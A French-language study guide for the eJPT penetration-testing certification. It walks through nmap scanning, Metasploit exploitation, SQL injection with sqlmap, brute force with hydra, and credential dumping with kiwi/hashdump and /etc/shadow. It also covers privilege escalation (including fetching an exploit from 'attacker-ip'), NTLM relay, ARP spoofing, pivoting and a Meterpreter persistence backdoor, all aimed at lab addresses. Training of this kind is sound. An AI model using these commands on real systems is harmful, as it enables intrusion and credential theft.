# eJPT – Réussite totale avec Metasploit, nmap/db_nmap, searchsploit et outils bonus

## 1. Mini-intro vulgarisée 

Bienvenue dans ce guide conçu pour vous aider à décrocher la certification eJPT (eLearnSecurity Junior Penetration Tester) ! Pas de panique si vous débutez. L'objectif ici est simple : vous montrer pas à pas comment utiliser les outils essentiels comme Nmap pour scanner, Metasploit pour exploiter les failles, et d'autres astuces pour réussir l'examen. On va décortiquer ensemble la méthode d'un test d'intrusion, depuis la découverte des cibles jusqu'à la prise de contrôle, le tout expliqué clairement. Préparez votre Kali Linux, on commence l'aventure du hacking éthique !

## 2. Pré-requis

Avant de plonger dans les techniques et les outils, assurons-nous que vous avez tout ce qu'il faut pour suivre ce guide et vous entraîner efficacement pour l'eJPT. Voici la liste des éléments indispensables :

*   **Kali Linux (version 2024.1 recommandée)** : C'est la distribution Linux de référence pour les professionnels de la sécurité et les pentesteurs. Elle vient avec une panoplie d'outils pré-installés, dont la plupart de ceux que nous allons utiliser (Nmap, Metasploit, Searchsploit, etc.). Vous pouvez l'installer sur une machine physique, en dual-boot, ou, plus couramment, dans une machine virtuelle (VMware, VirtualBox). Assurez-vous qu'elle est à jour (`sudo apt update && sudo apt full-upgrade -y`).
*   **Connexion VPN aux laboratoires INE** : L'examen eJPT et une grande partie de la formation se déroulent sur les plateformes de laboratoire d'INE (anciennement eLearnSecurity). Vous aurez besoin de télécharger un fichier de configuration VPN (généralement OpenVPN) fourni par INE et de vous y connecter pour accéder aux machines cibles de vos entraînements et de l'examen.
*   **Metasploit Framework** : L'un des outils centraux de ce guide et de l'examen. C'est une plateforme open-source extrêmement puissante pour développer, tester et utiliser des exploits contre des systèmes distants. Il est pré-installé sur Kali. Nous apprendrons à l'initialiser et à l'utiliser intensivement.
*   **Searchsploit** : Un outil en ligne de commande qui permet de rechercher rapidement dans la base de données Exploit-DB (une archive publique d'exploits). Très utile pour trouver des exploits connus pour des logiciels ou systèmes spécifiques identifiés lors de la phase de reconnaissance. Également pré-installé sur Kali.
*   **Listes de mots (Wordlists)** : Essentielles pour les attaques par force brute (par exemple, sur des identifiants de connexion). La plus célèbre est `rockyou.txt`, souvent incluse dans Kali (généralement dans `/usr/share/wordlists/`). La collection SecLists est également une référence (`sudo apt install seclists` si besoin).

**En clair, pour un débutant** : Avant de commencer, assurez-vous d'avoir votre 'couteau suisse' du hacker (Kali Linux), un tunnel sécurisé vers les labos (VPN), l'outil magique pour exploiter les failles (Metasploit), un catalogue de failles connues (Searchsploit) et des listes de mots de passe courants (Wordlists).

## 3. Vue d'ensemble de l'examen

L'examen eJPT est conçu pour évaluer vos compétences pratiques en tant que pentesteur débutant. Voici ce que vous devez savoir sur son format et son déroulement :

### Format et durée
* **Durée totale** : 48 heures (2 jours complets)
* **Temps recommandé** : 12-14 heures effectives de travail
* **Type d'évaluation** : Examen pratique + QCM
* **Nombre de questions** : 35 questions à choix multiples
* **Seuil de réussite** : 70 points minimum (sur 100)
* **Environnement** : Laboratoire virtuel accessible via VPN

### Structure de l'examen
L'examen se déroule en deux parties principales :
1. **Partie pratique** : Vous recevrez les instructions pour vous connecter à un environnement de laboratoire via VPN. Cet environnement contient plusieurs machines vulnérables que vous devrez explorer, énumérer et exploiter. Les informations que vous découvrirez (comme des identifiants, des hachages de mots de passe, des fichiers spécifiques) vous permettront de répondre aux questions du QCM.
2. **Partie QCM** : Les questions portent directement sur ce que vous avez découvert dans l'environnement de laboratoire. Par exemple : "Quel est le mot de passe de l'utilisateur X sur la machine Y ?" ou "Quelle vulnérabilité a permis d'obtenir un accès au serveur Z ?".

### Time-boxing et gestion du temps
Pour réussir l'eJPT, une bonne gestion du temps est essentielle. Voici une approche recommandée :

* **Reconnaissance initiale** : 2-3 heures
* **Énumération approfondie** : 3-4 heures
* **Exploitation des vulnérabilités** : 4-5 heures
* **Post-exploitation et collecte d'informations** : 2-3 heures
* **Réponse aux questions du QCM** : 1-2 heures

N'oubliez pas de prendre des notes détaillées tout au long de votre progression. Documentez chaque découverte, chaque commande importante et chaque résultat significatif. Ces notes seront cruciales pour répondre aux questions du QCM.

**En clair, pour un débutant** : L'examen dure 48h mais prévoyez 12-14h de travail réel. Vous devez pirater plusieurs machines dans un labo virtuel, puis répondre à 35 questions sur vos découvertes. Il faut obtenir 70/100 pour réussir. Organisez bien votre temps et prenez des notes !

## 4. Méthodologie "Scan → Enum → Exploit → Post-Exploitation → Privesc → Loot"

La réussite de l'eJPT repose sur une méthodologie structurée et systématique. Voici la chaîne d'actions que vous devrez maîtriser pour l'examen :

### Vue d'ensemble de la méthodologie

1. **Scan** : Découverte des hôtes et services actifs sur le réseau
2. **Énumération** : Identification précise des services, versions et configurations
3. **Exploitation** : Utilisation des vulnérabilités pour obtenir un accès initial
4. **Post-exploitation** : Collecte d'informations sur le système compromis
5. **Élévation de privilèges** : Obtention de droits administrateur/root
6. **Loot** : Récupération de données sensibles (identifiants, hachages, etc.)

Cette approche méthodique vous permet de ne rien oublier et d'avancer efficacement dans votre test d'intrusion.

### Mini-lab INE : "Nmap Host Discovery"

Ce laboratoire d'INE est essentiel pour comprendre comment identifier les hôtes actifs sur un réseau. Voici les principales commandes à maîtriser :

```bash
# Scan ping simple pour découvrir les hôtes actifs
sudo nmap -sn 10.10.10.0/24

# Scan TCP SYN sur les 1000 ports les plus courants
sudo nmap -sS 10.10.10.0/24

# Scan complet avec détection de version et de système d'exploitation
sudo nmap -sS -sV -O 10.10.10.15
```

**En clair, pour un débutant** : Ces commandes permettent de "cartographier" le réseau pour trouver quelles machines sont allumées et quels services elles font tourner, comme un radar qui détecte les bateaux en mer.

### Mini-lab INE : "Importing Nmap Scan Results Into MSF"

L'intégration de Nmap avec Metasploit est une compétence cruciale pour l'eJPT. Voici comment procéder :

```bash
# Démarrer la base de données PostgreSQL (nécessaire pour Metasploit)
sudo systemctl start postgresql

# Initialiser la base de données Metasploit
sudo msfdb init

# Lancer Metasploit Framework Console
sudo msfconsole

# Dans Metasploit, vérifier la connexion à la base de données
msf > db_status

# Effectuer un scan Nmap directement depuis Metasploit
msf > db_nmap -sS -sV 10.10.10.15

# Lister les hôtes découverts
msf > hosts

# Lister les services découverts
msf > services
```

**En clair, pour un débutant** : Ces étapes permettent de stocker les résultats de vos scans dans une base de données que Metasploit peut utiliser. C'est comme créer un carnet d'adresses des vulnérabilités potentielles pour y accéder facilement plus tard.

## 5. Recon & Enum

La reconnaissance (Recon) et l'énumération (Enum) constituent la première phase critique de tout test d'intrusion. Cette étape détermine souvent le succès ou l'échec de votre mission. Voyons comment l'aborder efficacement pour l'eJPT.

### Reconnaissance réseau

La première étape consiste à comprendre la topologie du réseau cible :

```bash
# Découverte des hôtes actifs sur le réseau
sudo nmap -sn 10.10.10.0/24

# Scan rapide avec masscan (plus rapide que nmap pour les grands réseaux)
sudo masscan -p1-65535 10.10.10.0/24 --rate=1000

# Alternative avec rustscan (très rapide)
rustscan -a 10.10.10.0/24 -- -sV
```

**En clair, pour un débutant** : Ces outils vous aident à trouver rapidement quelles machines sont actives sur le réseau et quels ports sont ouverts, comme si vous testiez quelles portes sont déverrouillées dans un bâtiment.

### Énumération des services

Une fois les hôtes identifiés, il faut déterminer précisément quels services tournent sur chaque port ouvert :

```bash
# Scan détaillé d'un hôte spécifique
sudo nmap -sS -sV -sC -p- -oA scan_complet 10.10.10.15

# Explication des options :
# -sS : Scan SYN (semi-ouvert)
# -sV : Détection de version
# -sC : Scripts par défaut
# -p- : Tous les ports (1-65535)
# -oA : Sauvegarde au format Nmap, XML et greppable
```

**En clair, pour un débutant** : Cette commande examine en détail chaque "porte" (port) ouverte pour identifier quel service tourne derrière et quelle version, révélant ainsi les potentielles faiblesses.

### Énumération des services spécifiques

#### Énumération SMB/Windows

```bash
# Énumération SMB avec enum4linux-ng
enum4linux-ng -A 10.10.10.15

# Lister les partages SMB avec smbmap
smbmap -H 10.10.10.15

# Explorer un partage SMB
smbclient //10.10.10.15/share -U "guest"
```

**En clair, pour un débutant** : Ces commandes explorent les dossiers partagés sur les machines Windows, parfois accessibles sans mot de passe, comme essayer d'ouvrir des tiroirs dans un bureau pour voir ce qu'ils contiennent.

#### Énumération Web

```bash
# Scan des répertoires web avec gobuster
gobuster dir -u http://10.10.10.15 -w /usr/share/wordlists/dirb/common.txt

# Alternative avec ffuf (plus rapide)
ffuf -u http://10.10.10.15/FUZZ -w /usr/share/wordlists/dirb/common.txt

# Scan de vulnérabilités web avec nikto
nikto -h http://10.10.10.15
```

**En clair, pour un débutant** : Ces outils cherchent des pages web cachées ou mal protégées, comme si vous testiez différentes combinaisons pour trouver des pièces secrètes dans un château.

#### Énumération des services d'authentification

```bash
# Test de connexion SSH avec utilisateurs courants
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://10.10.10.15

# Test de formulaire web
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.15 http-post-form "/login.php:username=^USER^&password=^PASS^:Login failed"
```

**En clair, pour un débutant** : Hydra essaie automatiquement des milliers de combinaisons d'identifiants/mots de passe, comme si vous testiez rapidement toutes les clés possibles sur une serrure.

### Lab INE : Information Gathering, Footprinting & Scanning, Enumeration CTF 1

Dans ces labs d'INE, vous apprendrez à :
- Utiliser Nmap pour découvrir des hôtes et services
- Identifier les systèmes d'exploitation et versions de services
- Énumérer les utilisateurs et partages sur des systèmes Windows
- Découvrir des pages web cachées et des vulnérabilités potentielles

Les compétences acquises dans ces labs sont directement applicables à l'examen eJPT, où vous devrez effectuer une reconnaissance complète avant de pouvoir exploiter les vulnérabilités.

**En clair, pour un débutant** : Ces exercices pratiques vous apprennent à collecter méthodiquement des informations sur votre cible, étape essentielle avant toute tentative d'exploitation. C'est comme étudier un bâtiment avant de planifier comment y entrer.

## 6. Vulnerability Assessment rapide

L'évaluation des vulnérabilités est une étape cruciale qui fait le lien entre la reconnaissance et l'exploitation. Elle vous permet d'identifier les faiblesses potentielles des systèmes cibles que vous pourrez ensuite exploiter.

### Principes de base

L'évaluation des vulnérabilités consiste à analyser les informations recueillies lors de la phase de reconnaissance pour identifier les vulnérabilités potentielles. Cette étape doit être méthodique et exhaustive, mais aussi rapide pour l'eJPT.

```bash
# Recherche de vulnérabilités avec searchsploit
searchsploit apache 2.4.49

# Recherche plus précise
searchsploit "Windows Server 2016" local privilege

# Mise à jour de la base de données
searchsploit -u
```

**En clair, pour un débutant** : Searchsploit est comme un moteur de recherche spécialisé qui vous aide à trouver des failles connues dans les logiciels que vous avez identifiés pendant la reconnaissance.

### Évaluation automatisée des vulnérabilités

Plusieurs outils peuvent automatiser partiellement cette phase :

```bash
# Scan de vulnérabilités web avec Nikto
nikto -h http://10.10.10.15 -o nikto_results.txt

# Scan de vulnérabilités SQL avec sqlmap
sqlmap -u "http://10.10.10.15/page.php?id=1" --dbs

# Scan de vulnérabilités avec Nmap et ses scripts
sudo nmap -sV --script vuln 10.10.10.15
```

**En clair, pour un débutant** : Ces outils analysent automatiquement les systèmes pour trouver des faiblesses connues, comme un inspecteur qui vérifie un bâtiment pour repérer les défauts structurels.

### Analyse manuelle des versions

L'identification précise des versions des services est essentielle :

```bash
# Exemple de résultat Nmap à analyser
# 80/tcp open  http    Apache httpd 2.4.49
# 22/tcp open  ssh     OpenSSH 7.9p1
```

Pour chaque service et version identifiés :
1. Recherchez dans searchsploit
2. Consultez les bases de données de vulnérabilités en ligne (CVE, Exploit-DB)
3. Vérifiez les configurations par défaut et les mauvaises pratiques courantes

**En clair, pour un débutant** : Cette étape consiste à vérifier si les versions des logiciels que vous avez trouvées sont connues pour avoir des failles de sécurité, comme vérifier si une serrure a déjà été signalée comme défectueuse.

### Lab INE : Vulnerability Assessment CTF 1

Ce lab d'INE vous permet de mettre en pratique l'évaluation des vulnérabilités dans un environnement contrôlé. Vous y apprendrez à :
- Identifier les services vulnérables
- Utiliser des outils automatisés pour détecter les vulnérabilités
- Analyser manuellement les résultats pour confirmer les failles
- Prioriser les vulnérabilités à exploiter

Les compétences acquises dans ce lab sont directement applicables à l'examen eJPT, où vous devrez rapidement identifier les vulnérabilités exploitables.

**En clair, pour un débutant** : Ce lab vous entraîne à repérer efficacement les faiblesses des systèmes informatiques, compétence essentielle pour savoir où concentrer vos efforts lors de l'examen.

## 7. Exploitation

L'exploitation est le cœur du test d'intrusion, où vous utilisez les vulnérabilités identifiées pour obtenir un accès aux systèmes cibles. Pour l'eJPT, vous devrez maîtriser plusieurs outils d'exploitation, avec un focus particulier sur Metasploit.

### Metasploit Framework

Metasploit est l'outil central pour l'exploitation dans l'eJPT. Voici comment l'utiliser efficacement :

```bash
# Lancer Metasploit
sudo msfconsole

# Rechercher un exploit spécifique
msf > search type:exploit platform:windows apache

# Utiliser un exploit
msf > use exploit/windows/http/apache_tika_rce

# Configurer les options de l'exploit
msf > show options
msf > set RHOSTS 10.10.10.15
msf > set LHOST 10.10.14.5  # Votre adresse IP sur le VPN
msf > set LPORT 4444

# Vérifier que tout est configuré correctement
msf > check

# Lancer l'exploit
msf > exploit
```

**En clair, pour un débutant** : Metasploit est comme une boîte à outils spécialisée pour les hackers. Vous choisissez l'outil adapté à la faille que vous avez trouvée, vous le configurez avec les bonnes adresses, puis vous l'activez pour obtenir un accès.

### Exploitation manuelle avec searchsploit

Parfois, vous devrez utiliser des exploits manuels :

```bash
# Trouver un exploit
searchsploit apache 2.4.49

# Copier l'exploit dans votre répertoire de travail
searchsploit -m 50383.py

# Examiner le code de l'exploit
cat 50383.py

# Modifier l'exploit si nécessaire (adresses IP, ports, etc.)
nano 50383.py

# Exécuter l'exploit
python3 50383.py http://10.10.10.15
```

**En clair, pour un débutant** : Cette méthode est comme utiliser un outil spécialisé que vous devez parfois ajuster vous-même, contrairement à Metasploit qui est plus automatisé. C'est comme choisir entre une boîte à outils complète et un outil unique mais précis.

### Exploitation des applications web avec sqlmap

Les injections SQL sont courantes dans l'eJPT :

```bash
# Test basique d'injection SQL
sqlmap -u "http://10.10.10.15/page.php?id=1"

# Extraction des bases de données
sqlmap -u "http://10.10.10.15/page.php?id=1" --dbs

# Extraction des tables d'une base de données
sqlmap -u "http://10.10.10.15/page.php?id=1" -D database_name --tables

# Extraction des données d'une table
sqlmap -u "http://10.10.10.15/page.php?id=1" -D database_name -T users --dump

# Obtenir un shell via SQL injection
sqlmap -u "http://10.10.10.15/page.php?id=1" --os-shell
```

**En clair, pour un débutant** : SQLmap teste automatiquement si un site web est vulnérable aux injections SQL (une faille permettant de manipuler la base de données). Si c'est le cas, il peut extraire des informations ou même vous donner un accès au serveur.

### Labs INE : "Exploiting Windows Vulnerabilities" & "Exploiting Linux Vulnerabilities"

Ces labs d'INE vous permettent de pratiquer l'exploitation sur des systèmes Windows et Linux. Vous y apprendrez à :
- Identifier les vulnérabilités spécifiques à chaque système d'exploitation
- Utiliser Metasploit pour exploiter ces vulnérabilités
- Comprendre les différences entre l'exploitation de Windows et Linux
- Adapter votre approche en fonction du système cible

Les compétences acquises dans ces labs sont directement applicables à l'examen eJPT, où vous rencontrerez probablement des systèmes Windows et Linux vulnérables.

**En clair, pour un débutant** : Ces exercices pratiques vous apprennent à exploiter différentes failles selon le système d'exploitation, comme un serrurier qui maîtrise différentes techniques selon le type de serrure à ouvrir.



## 8. Post-Exploitation & Credential Dumping

Une fois que vous avez obtenu un accès initial à un système, l'étape suivante consiste à explorer ce système, collecter des informations sensibles et extraire des identifiants qui pourront vous servir pour pivoter vers d'autres machines.

### Exploration du système compromis

Après avoir obtenu un shell sur un système, voici les premières actions à effectuer :

```bash
# Sur un système Windows (dans un shell Meterpreter)
meterpreter > sysinfo
meterpreter > getuid
meterpreter > ps  # Liste des processus
meterpreter > ipconfig  # Configuration réseau

# Sur un système Linux (dans un shell standard)
whoami
id
uname -a
ifconfig ou ip a
netstat -tuln
```

**En clair, pour un débutant** : Ces commandes vous permettent de comprendre où vous êtes, qui vous êtes sur le système, et quelles sont les connexions réseau disponibles. C'est comme explorer une pièce dans laquelle vous venez d'entrer pour savoir ce qu'elle contient.

### Extraction d'identifiants sur Windows

Windows stocke les identifiants de plusieurs façons que vous pouvez exploiter :

```bash
# Dans Meterpreter
meterpreter > load kiwi  # Charge l'extension Mimikatz
meterpreter > creds_all  # Extrait tous les identifiants

# Dumping de la mémoire LSASS (Local Security Authority Subsystem Service)
meterpreter > migrate -N lsass.exe  # Migration vers le processus LSASS
meterpreter > dump_secrets  # Extraction des secrets

# Extraction des hachages SAM
meterpreter > hashdump
```

**En clair, pour un débutant** : Ces techniques permettent d'extraire les mots de passe stockés dans la mémoire ou les fichiers système de Windows. C'est comme trouver un trousseau de clés qui pourrait ouvrir d'autres portes du réseau.

### Extraction d'identifiants sur Linux

Sur Linux, les identifiants sont stockés différemment :

```bash
# Fichiers de mots de passe et de shadow
cat /etc/passwd
cat /etc/shadow  # Nécessite des privilèges root

# Historique des commandes
cat ~/.bash_history

# Fichiers de configuration SSH
cat ~/.ssh/id_rsa  # Clé privée SSH
cat ~/.ssh/known_hosts  # Hôtes connus

# Identifiants stockés dans des fichiers de configuration
find / -name "*.conf" -o -name "*.config" -o -name "*.ini" 2>/dev/null | xargs grep -l "password"
```

**En clair, pour un débutant** : Ces commandes recherchent les mots de passe stockés dans différents fichiers sur un système Linux. C'est comme fouiller dans les tiroirs d'un bureau pour trouver des documents confidentiels.

### Utilisation des outils spécialisés

Des outils dédiés peuvent automatiser la collecte d'informations :

```bash
# Sur Windows, télécharger et exécuter winPEAS
meterpreter > upload /usr/share/peass/winpeas/winPEASx64.exe C:\\Windows\\Temp\\
meterpreter > shell
C:\Windows\Temp> winPEASx64.exe

# Sur Linux, télécharger et exécuter linPEAS
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

**En clair, pour un débutant** : Ces outils automatisent la recherche d'informations sensibles et de vulnérabilités sur un système compromis. Ils font en quelques minutes ce qui prendrait des heures manuellement, comme un détecteur de métaux qui trouve rapidement des objets cachés.

### Labs INE : "Windows Credential Dumping" & "Linux Credential Dumping"

Ces labs d'INE vous permettent de pratiquer l'extraction d'identifiants sur des systèmes Windows et Linux. Vous y apprendrez à :
- Utiliser Mimikatz/Kiwi pour extraire des identifiants Windows
- Exploiter les fichiers de configuration pour trouver des mots de passe
- Comprendre les différentes méthodes de stockage des identifiants selon le système
- Utiliser les identifiants extraits pour pivoter vers d'autres systèmes

Les compétences acquises dans ces labs sont essentielles pour l'examen eJPT, où l'extraction d'identifiants vous permettra souvent de progresser dans le réseau cible.

**En clair, pour un débutant** : Ces exercices vous apprennent à trouver et utiliser les mots de passe stockés sur les systèmes que vous avez compromis, compétence cruciale pour avancer dans un réseau comme l'examen eJPT vous demandera de le faire.

## 9. Privilege Escalation

L'élévation de privilèges est une étape cruciale qui vous permet de passer d'un accès limité à un accès administrateur ou root. Cette compétence est essentielle pour l'eJPT et souvent nécessaire pour accéder à certaines informations sensibles.

### Élévation de privilèges sur Windows

Sur Windows, plusieurs vecteurs d'élévation de privilèges sont couramment exploités :

```bash
# Dans un shell Meterpreter, vérifier les privilèges actuels
meterpreter > getuid
meterpreter > getprivs

# Utiliser l'exploit suggéré par winPEAS
meterpreter > background  # Mettre en arrière-plan la session actuelle
msf > use exploit/windows/local/suggested_exploit
msf > set SESSION 1
msf > exploit

# Utiliser des exploits courants comme PrintSpoofer
meterpreter > upload /path/to/PrintSpoofer.exe C:\\Windows\\Temp\\
meterpreter > shell
C:\Windows\Temp> PrintSpoofer.exe -i -c cmd
```

**En clair, pour un débutant** : Ces techniques vous permettent de passer d'un utilisateur standard à administrateur sur Windows. C'est comme trouver un moyen de débloquer toutes les fonctionnalités d'un appareil qui étaient verrouillées par un contrôle parental.

### Élévation de privilèges sur Linux

Sur Linux, d'autres méthodes sont utilisées :

```bash
# Vérifier les permissions SUID
find / -perm -u=s -type f 2>/dev/null

# Vérifier les tâches planifiées
cat /etc/crontab

# Vérifier les binaires avec capacités spéciales
getcap -r / 2>/dev/null

# Vérifier les permissions sudo
sudo -l

# Utiliser un exploit de noyau suggéré par linPEAS
wget http://attacker-ip/exploit.c
gcc exploit.c -o exploit
chmod +x exploit
./exploit
```

**En clair, pour un débutant** : Ces commandes recherchent des configurations mal sécurisées qui permettent à un utilisateur normal de devenir administrateur (root) sur Linux. C'est comme trouver une porte dérobée dans un système de sécurité.

### Outils spécialisés pour l'élévation de privilèges

Des outils dédiés peuvent automatiser la recherche de vecteurs d'élévation de privilèges :

```bash
# Sur Windows, en plus de winPEAS
# PowerUp (script PowerShell)
meterpreter > load powershell
meterpreter > powershell_import /path/to/PowerUp.ps1
meterpreter > powershell_execute "Invoke-AllChecks"

# Sur Linux, en plus de linPEAS
# Linux Smart Enumeration (LSE)
wget https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh
chmod +x lse.sh
./lse.sh -l 1 -i  # Level 1 avec informations détaillées
```

**En clair, pour un débutant** : Ces outils analysent automatiquement le système pour trouver des faiblesses permettant d'obtenir des privilèges plus élevés. Ils font le travail d'un expert en sécurité qui connaît toutes les failles courantes.

### Surveillance des processus

La surveillance des processus peut révéler des opportunités d'élévation de privilèges :

```bash
# Sur Linux, utiliser pspy pour surveiller les processus sans privilèges root
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
chmod +x pspy64
./pspy64
```

**En clair, pour un débutant** : Cet outil vous permet d'espionner les processus qui s'exécutent sur le système, même ceux lancés par l'administrateur, pour repérer des opportunités d'élévation de privilèges.

### Labs INE : "Windows PrivEsc" & "Linux PrivEsc"

Ces labs d'INE vous permettent de pratiquer l'élévation de privilèges sur des systèmes Windows et Linux. Vous y apprendrez à :
- Identifier les vecteurs d'élévation de privilèges courants
- Utiliser des outils automatisés pour détecter les vulnérabilités
- Exploiter des configurations incorrectes pour obtenir des privilèges élevés
- Comprendre les différences entre l'élévation de privilèges sur Windows et Linux

Les compétences acquises dans ces labs sont essentielles pour l'examen eJPT, où vous devrez souvent élever vos privilèges pour accéder à certaines informations.

**En clair, pour un débutant** : Ces exercices vous apprennent à passer d'un accès limité à un accès complet sur un système, compétence indispensable pour obtenir toutes les informations demandées dans l'examen eJPT.

## 10. Host & Network attacks spécifiques

Dans l'examen eJPT, vous rencontrerez probablement des scénarios d'attaques spécifiques ciblant des hôtes ou des réseaux. Cette section couvre les techniques les plus courantes que vous devrez maîtriser.

### Attaques NetBIOS et SMB

Les services NetBIOS et SMB sont souvent des cibles privilégiées dans les environnements Windows :

```bash
# Énumération NetBIOS
nbtscan 10.10.10.0/24

# Énumération SMB complète
enum4linux-ng -A 10.10.10.15

# Connexion à un partage SMB
smbclient //10.10.10.15/share -U "username%password"

# Exécution de commandes via SMB (PsExec)
msfconsole
use exploit/windows/smb/psexec
set SMBDomain WORKGROUP
set SMBUser administrator
set SMBPass password
set RHOSTS 10.10.10.15
exploit
```

**En clair, pour un débutant** : Ces commandes vous permettent d'explorer et d'exploiter les partages de fichiers Windows. C'est comme accéder à distance aux dossiers partagés d'un ordinateur, puis utiliser cette connexion pour exécuter vos propres commandes.

### Attaques de relais NTLM

Les attaques de relais peuvent être très efficaces dans certains environnements :

```bash
# Configuration de Responder pour capturer les hachages NTLM
sudo responder -I tun0 -wrf

# Utilisation de ntlmrelayx pour relayer les authentifications
sudo ntlmrelayx.py -tf targets.txt -smb2support
```

**En clair, pour un débutant** : Ces outils interceptent les tentatives de connexion des utilisateurs et les redirigent vers d'autres systèmes. C'est comme si vous interceptiez quelqu'un qui frappe à une porte et utilisiez son identité pour frapper à une autre porte.

### Attaques par empoisonnement ARP

L'empoisonnement ARP permet d'intercepter le trafic réseau :

```bash
# Activer le forwarding IP
sudo sysctl -w net.ipv4.ip_forward=1

# Empoisonnement ARP avec arpspoof
sudo arpspoof -i tun0 -t 10.10.10.15 10.10.10.1  # Cible vers passerelle
sudo arpspoof -i tun0 -t 10.10.10.1 10.10.10.15  # Passerelle vers cible

# Capture du trafic avec Wireshark ou tcpdump
sudo tcpdump -i tun0 -w capture.pcap host 10.10.10.15
```

**En clair, pour un débutant** : Cette technique vous permet de vous positionner entre deux machines pour intercepter leurs communications. C'est comme rediriger le courrier de quelqu'un vers vous avant de le transmettre au destinataire final.

### Lab INE : NetBIOS Hacking

Ce lab d'INE vous permet de pratiquer les attaques contre les services NetBIOS et SMB. Vous y apprendrez à :
- Énumérer les partages et utilisateurs via NetBIOS
- Exploiter les configurations SMB vulnérables
- Accéder aux ressources partagées sans authentification
- Exécuter des commandes à distance via SMB

### Labs INE : System/Host-Based Attacks CTF 1 & 2

Ces labs d'INE vous permettent de mettre en pratique diverses attaques contre des systèmes hôtes. Vous y apprendrez à :
- Exploiter des vulnérabilités spécifiques aux systèmes d'exploitation
- Contourner les mécanismes de sécurité basiques
- Comprendre les vecteurs d'attaque courants contre les hôtes
- Appliquer une méthodologie complète de test d'intrusion

Les compétences acquises dans ces labs sont directement applicables à l'examen eJPT, où vous rencontrerez probablement des scénarios similaires.

**En clair, pour un débutant** : Ces exercices vous apprennent à exploiter les faiblesses spécifiques des réseaux Windows et des protocoles réseau, compétences essentielles pour l'eJPT où vous devrez souvent naviguer dans des environnements Windows.

## 11. ⚡ Quick Ops – 12 commandes immanquables

Voici une liste des 12 commandes les plus importantes que vous devriez maîtriser pour l'eJPT. Ces commandes constituent votre "kit de survie" et vous permettront de résoudre la plupart des défis de l'examen.

### Check-list Start-to-Flag

1. **Scan réseau initial**
```bash
sudo nmap -sn 10.10.10.0/24
```
Cette commande effectue un scan ping pour découvrir rapidement les hôtes actifs sur le réseau.

**En clair, pour un débutant** : C'est votre première étape pour cartographier le réseau et savoir quelles machines sont allumées, comme allumer la lumière dans une pièce sombre.

2. **Scan de ports détaillé**
```bash
sudo nmap -sS -sV -sC -p- -oA scan_complet 10.10.10.15
```
Cette commande effectue un scan complet de tous les ports avec détection de version et scripts par défaut.

**En clair, pour un débutant** : Cette commande examine en profondeur une machine pour identifier tous ses points d'entrée potentiels et les services qui y tournent.

3. **Intégration Nmap dans Metasploit**
```bash
sudo msfdb init && sudo msfconsole -q
msf > db_nmap -sS -sV 10.10.10.15
```
Cette séquence initialise la base de données Metasploit et y importe directement les résultats de Nmap.

**En clair, pour un débutant** : Vous préparez votre "arsenal" d'attaque en stockant les informations de reconnaissance dans une base de données facilement exploitable.

4. **Recherche d'exploits**
```bash
searchsploit apache 2.4.49
```
Cette commande recherche des exploits connus pour une version spécifique d'un service.

**En clair, pour un débutant** : Vous consultez un catalogue de failles connues pour voir si le service que vous avez identifié a des vulnérabilités documentées.

5. **Énumération SMB rapide**
```bash
enum4linux-ng -A 10.10.10.15
```
Cette commande effectue une énumération complète des services SMB/Windows.

**En clair, pour un débutant** : Vous explorez les partages de fichiers Windows et les informations sur les utilisateurs, souvent une mine d'or pour progresser dans un réseau.

6. **Scan de répertoires web**
```bash
gobuster dir -u http://10.10.10.15 -w /usr/share/wordlists/dirb/common.txt
```
Cette commande recherche des répertoires et fichiers cachés sur un serveur web.

**En clair, pour un débutant** : Vous cherchez des pages web non référencées qui pourraient contenir des informations sensibles ou des vulnérabilités.

7. **Exploitation avec Metasploit**
```bash
msf > use exploit/windows/http/apache_tika_rce
msf > set RHOSTS 10.10.10.15
msf > set LHOST tun0
msf > exploit
```
Cette séquence configure et lance un exploit via Metasploit.

**En clair, pour un débutant** : Vous utilisez un outil automatisé pour exploiter une faille identifiée et obtenir un accès au système cible.

8. **Extraction d'identifiants Windows**
```bash
meterpreter > load kiwi
meterpreter > creds_all
```
Cette séquence charge l'extension Mimikatz dans Meterpreter et extrait tous les identifiants.

**En clair, pour un débutant** : Vous récupérez les mots de passe stockés dans la mémoire de Windows, comme trouver un trousseau de clés pour d'autres systèmes.

9. **Élévation de privilèges Linux rapide**
```bash
sudo -l
find / -perm -u=s -type f 2>/dev/null
```
Ces commandes vérifient rapidement les vecteurs d'élévation de privilèges courants sur Linux.

**En clair, pour un débutant** : Vous cherchez des configurations mal sécurisées qui pourraient vous permettre de devenir administrateur sur le système.

10. **Transfert de fichiers**
```bash
# De l'attaquant vers la cible
meterpreter > upload /path/to/file C:\\destination\\
# De la cible vers l'attaquant
meterpreter > download C:\\path\\to\\file /destination/
```
Ces commandes permettent de transférer des fichiers entre votre machine et la cible.

**En clair, pour un débutant** : Vous déplacez des outils ou des données entre les machines, comme envoyer ou récupérer des documents importants.

11. **Pivoting réseau**
```bash
meterpreter > run autoroute -s 10.10.20.0/24
msf > use auxiliary/server/socks_proxy
msf > set SRVPORT 9050
msf > run
```
Cette séquence configure un pivot pour accéder à d'autres réseaux à travers une machine compromise.

**En clair, pour un débutant** : Vous utilisez une machine compromise comme pont pour atteindre d'autres machines qui ne sont pas directement accessibles depuis votre position.

12. **Persistance rapide**
```bash
meterpreter > run persistence -X -i 60 -p 443 -r 10.10.14.5
```
Cette commande établit un mécanisme de persistance sur la machine compromise.

**En clair, pour un débutant** : Vous installez une "porte dérobée" pour pouvoir revenir facilement sur le système même s'il redémarre.

## 11 bis. TryHackMe & Hack The Box : machines conseillées avant l'eJPT

Pour vous préparer efficacement à l'eJPT, la pratique sur des machines vulnérables est essentielle. Voici une sélection des meilleures machines sur TryHackMe et Hack The Box, organisées par thème et niveau de difficulté.

### Tableau des machines recommandées

| Room/Box | Plateforme | Thème dominant | Pourquoi utile eJPT | Difficulté |
|----------|------------|----------------|---------------------|------------|
| **Intro to Pentesting** | TryHackMe | Méthodologie | Introduction complète aux concepts de base du pentest | Facile |
| **Nmap Room** | TryHackMe | Recon/Enum | Maîtrise de l'outil principal de reconnaissance | Facile |
| **Vulnversity** | TryHackMe | Enum/Exploit | Méthodologie complète sur une cible web | Facile |
